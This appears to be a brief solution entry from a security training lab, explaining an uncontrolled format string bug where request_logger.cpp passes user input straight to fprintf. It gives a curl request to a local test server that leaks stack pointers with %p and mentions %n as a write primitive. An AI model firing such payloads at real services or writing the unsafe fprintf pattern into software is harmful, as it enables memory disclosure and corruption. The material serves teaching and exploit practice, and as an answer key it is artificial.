# Solution — 03 · Uncontrolled Format String

**Code**: `request_logger.cpp` → `fprintf(log_file, value.c_str());`

Leak stack values by making the parameter *value* contain format specifiers:

```bash
curl "http://127.0.0.1:8081/?param=%p.%p.%p.%p.%p"
```

Inspect `/tmp/server.log` to see the leaked pointers. On glibc-based
Linux, replacing `%p` with `%n` gives a write primitive.
